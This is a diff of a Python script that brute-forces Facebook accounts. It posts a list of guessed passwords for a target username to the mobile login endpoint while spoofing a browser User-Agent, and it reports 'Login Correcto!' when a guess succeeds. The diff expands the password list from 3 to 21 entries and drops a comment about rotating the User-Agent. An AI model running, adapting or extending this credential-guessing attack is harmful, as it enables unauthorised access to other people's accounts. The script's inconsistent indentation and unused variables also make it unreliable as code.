@@ -31,10 +31,8 @@ def get_graphID_user(s, username):
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"
 
-def prueba(cont):
-    if cont==1:
-        print ("Llego al contado 1: ")
-        #aqui en vez del print debo poner s.headers["User-Agent"] = "OTRO AGENTE USER"
+
+contador_prueba=0
 
 # Retrieve the right parameters for the login
 data = requests.get("https://m.facebook.com/").text
@@ -46,14 +44,19 @@ for p in params.keys():
 
 # Set the important parameters
 
-prueba=['admin','123','santin']
+prueba=['admin','123','santin','123','prueba1','prueba2','12345678','prueba1','prueba2','prueba3',
+        'prueba4','prueba5','prueba6','prueba7','prueba8','prueba9','prueba10','walter','losamo2013a','prueba13',
+        'prueba14']
 contador=0
-while (contador <3):
+while (contador <21 ):
 	params['email'] = username
 	params['pass'] = prueba[contador]
 	params['login'] = 'Log In'
 
-	# Login
+	if contador==2:
+            contador_prueba=0
+            print ("Llego a contador")
+
 	r = s.post(r"https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&refid=8", data=params)
 
 	if '/recover/initiate/' in r.text:
@@ -61,7 +64,3 @@ while (contador <3):
 	    contador+=1
 	else:
 	    print (prueba[contador],": Login Correcto!")
-	
-    prueba(contador) # NO ME PERMITE CORRER AQUI O ASI PONGO SOLO EN IF CONTADOR ==1: PRINT (USER O PRINT LLEGO A 1)
-
-
